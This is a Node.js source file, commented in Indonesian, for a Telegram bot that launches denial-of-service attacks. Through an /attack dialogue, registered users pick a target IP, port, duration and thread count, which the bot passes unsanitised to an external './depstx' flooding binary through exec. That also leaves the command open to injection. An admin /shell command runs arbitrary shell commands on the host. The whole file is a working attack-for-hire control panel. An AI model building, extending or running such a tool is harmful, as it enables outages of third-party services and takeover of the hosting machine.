// Auto install dependencies jika belum ada
const execSync = require('child_process').execSync;
const deps = ['telegraf', 'fs', 'child_process'];
deps.forEach(dep => {
  try { require.resolve(dep); } catch (e) { execSync(`npm install ${dep}`); }
});

const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const { exec } = require('child_process');

// Konfigurasi
const ADMIN_IDS = [7316824198]; // Masukkan ID admin Anda di sini
const ALLOWED_GROUPS = [-1002573717371]; // Set ID Grup di sini jika ingin membatasi grup

const USER_FILE = 'stxusers.json';
const BOTS_FILE = 'bots.json';
const LOG_FILE = 'log.txt';

const MAX_DURATION = 360;
const MAX_THREAD = 1500;

// Inisialisasi file user dan bot bila belum ada
if (!fs.existsSync(USER_FILE)) fs.writeFileSync(USER_FILE, JSON.stringify([]));
if (!fs.existsSync(BOTS_FILE)) fs.writeFileSync(BOTS_FILE, JSON.stringify([]));

// Fungsi memuat user & bot
function loadUsers() {
  try { return JSON.parse(fs.readFileSync(USER_FILE)); } catch { return []; }
}
function saveUsers(users) {
  fs.writeFileSync(USER_FILE, JSON.stringify(users));
}
function loadBots() {
  try { return JSON.parse(fs.readFileSync(BOTS_FILE)); } catch { return []; }
}
function saveBots(tokens) {
  fs.writeFileSync(BOTS_FILE, JSON.stringify(tokens));
}
function logCommand(userId, cmd, params) {
  const line = `[${new Date().toLocaleString()}] UserID: ${userId} CMD: ${cmd} PARAMS: ${JSON.stringify(params)}\n`;
  fs.appendFileSync(LOG_FILE, line);
}

// Fungsi utama membuat bot baru
function createBot(token) {
  const bot = new Telegraf(token);

  // Middleware cek user dan grup
  bot.use(async (ctx, next) => {
    const userId = ctx.from?.id;
    const users = loadUsers();
    // Semua admin dan user terdaftar boleh, serta grup yang diizinkan
    if (
      ADMIN_IDS.includes(userId) ||
      users.includes(userId) ||
      (ctx.chat && ctx.chat.type.endsWith('group') && ALLOWED_GROUPS.includes(ctx.chat.id))
    ) {
      return next();
    }
    // Jika bukan admin/user/grup, tolak
    if (ctx.chat?.type === 'private') {
      await ctx.reply('❌ Akses ditolak. Silakan hubungi admin untuk meminta akses.');
    }
  });

  // /start
  bot.start(async ctx => {
    const userId = ctx.from.id;
    const fullName = ctx.from.first_name || '';
    await ctx.reply(`👋 Halo, ${fullName}!\nSelamat datang di Bot STX!\n\nGunakan /bantuan untuk melihat menu.`);
    // Kirim ID ke admin
    ADMIN_IDS.forEach(adminId => {
      bot.telegram.sendMessage(adminId, `Pengguna baru menekan /start:\n🆔 UserID: ${userId}\n👤 Nama: ${fullName}`);
    });
  });

  // /bantuan
  bot.command('bantuan', ctx => {
    ctx.reply(`📖 Fitur Bot:
- /adduser <id> : Tambah user baru (admin)
- /deleteuser <id> : Hapus user (admin)
- /attack : Mulai serangan
- /myid : Lihat ID Anda
- /shell <perintah> : Jalankan perintah shell (hanya admin)
- /addbot <token> : Tambah bot baru (hanya admin)
- /deletebot <token> : Hapus bot (hanya admin)
- /logs : Lihat log perintah (admin)
- /bantuan : Bantuan
`);
  });

  // /myid
  bot.command('myid', ctx => {
    ctx.reply(`🆔 ID Anda: ${ctx.from.id}`);
  });

  // /adduser & /deleteuser
  bot.command('adduser', ctx => {
    if (!ADMIN_IDS.includes(ctx.from.id)) return ctx.reply('❌ Hanya admin!');
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Format: /adduser <id>');
    const uid = Number(args[1]);
    let users = loadUsers();
    if (!users.includes(uid)) {
      users.push(uid);
      saveUsers(users);
      ctx.reply('✅ User berhasil ditambah.');
    } else ctx.reply('User sudah ada.');
  });

  bot.command('deleteuser', ctx => {
    if (!ADMIN_IDS.includes(ctx.from.id)) return ctx.reply('❌ Hanya admin!');
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Format: /deleteuser <id>');
    const uid = Number(args[1]);
    let users = loadUsers();
    if (users.includes(uid)) {
      users = users.filter(u => u !== uid);
      saveUsers(users);
      ctx.reply('✅ User berhasil dihapus.');
    } else ctx.reply('User tidak ditemukan.');
  });

  // /attack
  bot.command('attack', async ctx => {
    ctx.session ??= {};
    ctx.session.attack = {};
    ctx.session.attack.userId = ctx.from.id;
    ctx.session.attack.step = 1;
    await ctx.reply('Masukkan IP target:');
    bot.on('text', async innerCtx => {
      if (!innerCtx.session?.attack || innerCtx.from.id !== ctx.from.id) return;
      if (innerCtx.session.attack.step === 1) {
        innerCtx.session.attack.ip = innerCtx.message.text;
        innerCtx.session.attack.step = 2;
        await innerCtx.reply('Masukkan port:');
      } else if (innerCtx.session.attack.step === 2) {
        let port = parseInt(innerCtx.message.text);
        if (isNaN(port)) return innerCtx.reply('Port harus angka! Masukkan ulang port:');
        innerCtx.session.attack.port = port;
        innerCtx.session.attack.step = 3;
        await innerCtx.reply('Masukkan durasi (maks 360 detik):');
      } else if (innerCtx.session.attack.step === 3) {
        let durasi = parseInt(innerCtx.message.text);
        if (isNaN(durasi) || durasi > MAX_DURATION) return innerCtx.reply(`Durasi harus angka dan maksimal ${MAX_DURATION} detik! Masukkan ulang durasi:`);
        innerCtx.session.attack.durasi = durasi;
        innerCtx.session.attack.step = 4;
        await innerCtx.reply('Masukkan jumlah thread (maks 1500):');
      } else if (innerCtx.session.attack.step === 4) {
        let thread = parseInt(innerCtx.message.text);
        if (isNaN(thread) || thread > MAX_THREAD) return innerCtx.reply(`Thread harus angka dan maksimal ${MAX_THREAD}! Masukkan ulang thread:`);
        innerCtx.session.attack.thread = thread;
        innerCtx.session.attack.step = 5;
        // Konfirmasi
        await innerCtx.reply(`Konfirmasi serangan:\nIP: ${innerCtx.session.attack.ip}\nPort: ${innerCtx.session.attack.port}\nDurasi: ${innerCtx.session.attack.durasi}\nThread: ${innerCtx.session.attack.thread}`,
          Markup.inlineKeyboard([
            [Markup.button.callback('✅ YA', 'attack_yes'), Markup.button.callback('❌ TIDAK', 'attack_no')],
            [Markup.button.callback('🛑 STOP', 'attack_stop')]
          ])
        );
      }
    });
  });

  // Handler konfirmasi attack
  bot.action('attack_yes', async ctx => {
    const atk = ctx.session?.attack;
    if (!atk) return ctx.reply('Session tidak ditemukan.');
    // Eksekusi perintah
    const cmd = `./depstx ${atk.ip} ${atk.port} ${atk.durasi} ${atk.thread}`;
    logCommand(atk.userId, 'attack', atk);
    await ctx.reply('⏳ Menjalankan serangan...');
    setTimeout(() => {
      exec(cmd, (err, stdout, stderr) => {
        if (err) ctx.reply('❌ Gagal mengeksekusi serangan.');
        else ctx.reply('🔥 Serangan selesai!');
      });
    }, 4000); // Jeda 4 detik
    await ctx.deleteMessage();
  });

  bot.action('attack_no', async ctx => {
    await ctx.reply('❎ Serangan dibatalkan.');
    await ctx.deleteMessage();
  });
  bot.action('attack_stop', async ctx => {
    await ctx.reply('🛑 Permintaan stop serangan.');
    await ctx.deleteMessage();
  });

  // /shell (admin only)
  bot.command('shell', ctx => {
    if (!ADMIN_IDS.includes(ctx.from.id)) return ctx.reply('Hanya admin!');
    const cmd = ctx.message.text.replace('/shell', '').trim();
    if (!cmd) return ctx.reply('Perintah kosong!');
    exec(cmd, (err, stdout, stderr) => {
      if (err) ctx.reply('Error:\n' + stderr);
      else ctx.reply('Output:\n' + stdout);
    });
  });

  // /addbot & /deletebot (admin only)
  bot.command('addbot', ctx => {
    if (!ADMIN_IDS.includes(ctx.from.id)) return ctx.reply('❌ Hanya admin!');
    const token = ctx.message.text.split(' ')[1];
    if (!token) return ctx.reply('Format: /addbot <token>');
    let tokens = loadBots();
    if (!tokens.includes(token)) {
      tokens.push(token);
      saveBots(tokens);
      ctx.reply('✅ Bot baru ditambahkan! Restart script untuk menjalankan bot baru.');
    } else ctx.reply('Bot sudah ada.');
  });
  bot.command('deletebot', ctx => {
    if (!ADMIN_IDS.includes(ctx.from.id)) return ctx.reply('❌ Hanya admin!');
    const token = ctx.message.text.split(' ')[1];
    if (!token) return ctx.reply('Format: /deletebot <token>');
    let tokens = loadBots();
    if (tokens.includes(token)) {
      tokens = tokens.filter(t => t !== token);
      saveBots(tokens);
      ctx.reply('✅ Bot berhasil dihapus.');
    } else ctx.reply('Bot tidak ditemukan.');
  });

  // /logs (admin only)
  bot.command('logs', ctx => {
    if (!ADMIN_IDS.includes(ctx.from.id)) return ctx.reply('❌ Hanya admin!');
    if (!fs.existsSync(LOG_FILE)) return ctx.reply('Log kosong.');
    const logs = fs.readFileSync(LOG_FILE, 'utf8');
    ctx.replyWithDocument({ source: Buffer.from(logs), filename: 'log.txt' });
  });

  // Run bot
  bot.launch();
  console.log(`Bot berjalan dengan token: ${token}`);
}

// Jalankan semua bot dari file bots.json
const botTokens = loadBots();
if (botTokens.length === 0) {
  console.log('Belum ada token bot! Silakan jalankan /addbot <token> lewat chat bot admin.');
} else {
  botTokens.forEach(token => createBot(token));
}